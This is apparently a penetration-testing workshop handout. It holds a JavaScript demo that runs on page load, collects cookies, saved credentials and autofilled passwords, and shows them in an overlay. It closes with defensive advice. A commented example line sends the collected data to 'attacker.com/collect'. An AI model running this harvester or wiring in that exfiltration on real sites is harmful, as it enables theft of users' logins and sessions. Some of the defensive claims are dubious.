# Browser Credential Extraction Demo for Penetration Testing Workshop

**Important Note**: This code is for educational purposes only in a controlled penetration testing environment. Unauthorized use against systems you don't own or have permission to test is illegal.

```javascript
/**
 * Browser Credential Vulnerability Demonstration Script
 * 
 * This script demonstrates three common browser credential vulnerabilities:
 * 1. Cookie extraction from current domain
 * 2. Password extraction from credential storage
 * 3. Data exfiltration techniques
 * 
 * Security Vulnerabilities Demonstrated:
 * - Improper cookie security attributes (Missing HttpOnly, Secure flags)
 * - Credential storage accessibility via JavaScript
 * - Potential XSS leading to credential theft
 */

// =============================================
// 1. Cookie Extraction from Current Domain
// =============================================

/**
 * Extracts all accessible cookies from the current domain
 * Demonstrates vulnerability when cookies lack HttpOnly flag
 * HttpOnly cookies would be inaccessible to this script
 */
function extractCookies() {
    // document.cookie only returns cookies without HttpOnly flag
    const cookies = document.cookie;

    // Parse cookies into key-value pairs
    const cookieArray = cookies.split(';').map(cookie => {
        const [name, ...valueParts] = cookie.trim().split('=');
        return {
            name: name,
            value: valueParts.join('='), // In case the cookie value contains '='
            domain: window.location.hostname,
            path: '/', // Default path
            secure: false, // We can't determine this from JS
            httpOnly: false // By definition, we can't access HttpOnly cookies
        };
    });

    return cookieArray;
}

// =============================================
// 2. Password Extraction from Credential Storage
// =============================================

/**
 * Attempts to retrieve saved passwords from the browser's credential storage
 * Demonstrates the credential management API vulnerability
 * Modern browsers require user interaction (like a click) to reveal passwords
 */
async function extractSavedCredentials() {
    try {
        // Check if the Credential Management API is available
        if (!navigator.credentials || !navigator.credentials.get) {
            return { error: "Credential Management API not available" };
        }

        // Create a fake credential request
        const cred = await navigator.credentials.get({
            password: true,
            mediation: 'optional' // 'silent' would fail without user interaction
        });

        if (cred) {
            return {
                type: cred.type,
                id: cred.id,
                password: cred.password || 'not retrievable',
                origin: window.location.origin
            };
        }
        return null;
    } catch (e) {
        return { error: e.message };
    }
}

/**
 * Alternative method: Find password fields and attempt to access their values
 * Demonstrates how autofill can be exploited via DOM manipulation
 */
function extractFormCredentials() {
    const results = [];

    // Find all password input fields
    const passwordInputs = document.querySelectorAll('input[type="password"]');

    passwordInputs.forEach(input => {
        // Try to access the value directly (works if autofilled)
        if (input.value) {
            results.push({
                fieldName: input.name || input.id || 'unnamed',
                value: input.value,
                formId: input.form?.id || 'no-form-id'
            });
        }
    });

    return results;
}

// =============================================
// 3. Data Packaging and "Secure" Exfiltration
// =============================================

/**
 * Packages collected data for "analysis"
 * In a real attack, this would exfiltrate data to attacker's server
 * For our demo, we'll just display it in a "report"
 */
async function packageData() {
    const report = {
        timestamp: new Date().toISOString(),
        url: window.location.href,
        cookies: extractCookies(),
        credentials: await extractSavedCredentials(),
        formCredentials: extractFormCredentials(),
        userAgent: navigator.userAgent
    };

    return report;
}

/**
 * Displays results in a "report" format
 * In a real attack, this would be sent to attacker's server via:
 * - WebSockets
 * - Fetch/XHR to attacker domain
 * - Image beacon (data in query params)
 * - DNS exfiltration
 */
function displayReport(report) {
    // Create a secure container (from user's perspective)
    const container = document.createElement('div');
    container.style.position = 'fixed';
    container.style.bottom = '20px';
    container.style.right = '20px';
    container.style.width = '400px';
    container.style.maxHeight = '500px';
    container.style.overflow = 'auto';
    container.style.backgroundColor = '#f0f0f0';
    container.style.padding = '10px';
    container.style.border = '1px solid #ccc';
    container.style.zIndex = '9999';
    container.style.fontFamily = 'monospace';
    container.style.fontSize = '12px';

    // Add a title
    const title = document.createElement('h3');
    title.textContent = 'Security Report (Educational Demo)';
    title.style.marginTop = '0';
    container.appendChild(title);

    // Add close button
    const closeBtn = document.createElement('button');
    closeBtn.textContent = '×';
    closeBtn.style.position = 'absolute';
    closeBtn.style.top = '5px';
    closeBtn.style.right = '5px';
    closeBtn.style.background = 'none';
    closeBtn.style.border = 'none';
    closeBtn.style.cursor = 'pointer';
    closeBtn.onclick = () => container.remove();
    container.appendChild(closeBtn);

    // Add report content
    const pre = document.createElement('pre');
    pre.textContent = JSON.stringify(report, null, 2);
    container.appendChild(pre);

    // Add disclaimer
    const disclaimer = document.createElement('p');
    disclaimer.textContent = 'This is a educational demonstration of browser credential vulnerabilities. No data was transmitted externally.';
    disclaimer.style.fontSize = '10px';
    disclaimer.style.color = '#666';
    container.appendChild(disclaimer);

    document.body.appendChild(container);
}

// =============================================
// Main Execution
// =============================================

// Run the demonstration when the page loads
window.addEventListener('DOMContentLoaded', async () => {
    // Small delay to allow autofill to complete
    setTimeout(async () => {
        const report = await packageData();
        displayReport(report);

        // In a real attack, data would be exfiltrated here
        // Example: fetch('https://attacker.com/collect', { method: 'POST', body: JSON.stringify(report) });
    }, 1000);
});

// Alternative: Trigger with a button click for user interaction requirements
function runDemo() {
    packageData().then(displayReport);
}
```

## Security Vulnerabilities Demonstrated

1. **Cookie Extraction**:
   - Missing `HttpOnly` flag: Cookies without this flag can be accessed via JavaScript
   - Missing `Secure` flag: Cookies can be transmitted over unencrypted connections
   - Broad `Path` attribute: Cookies accessible across more paths than necessary

2. **Credential Storage Access**:
   - Credential Management API can reveal stored passwords
   - Autofilled passwords are accessible in DOM before user interaction
   - Forms without proper autocomplete="off" are vulnerable

3. **Data Exfiltration**:
   - Collected sensitive data could be sent to attacker servers
   - Multiple exfiltration methods available (XHR, WebSockets, DNS, etc.)
   - Difficult to detect when done carefully (slow, low-volume transfers)

## Defensive Measures to Highlight

1. **For Cookies**:
   - Always use `HttpOnly` flag for sensitive cookies
   - Use `Secure` flag for HTTPS-only transmission
   - Set appropriate `SameSite` attributes
   - Restrict cookie `Path` to only necessary routes

2. **For Credential Storage**:
   - Educate users about browser password manager risks
   - Use `autocomplete="off"` for sensitive forms
   - Implement custom password managers for high-security applications

3. **General Protections**:
   - Implement Content Security Policy (CSP) headers
   - Use Subresource Integrity (SRI) for external scripts
   - Regular security audits and penetration testing

This demonstration should be performed in a controlled lab environment with proper consent from all participants.

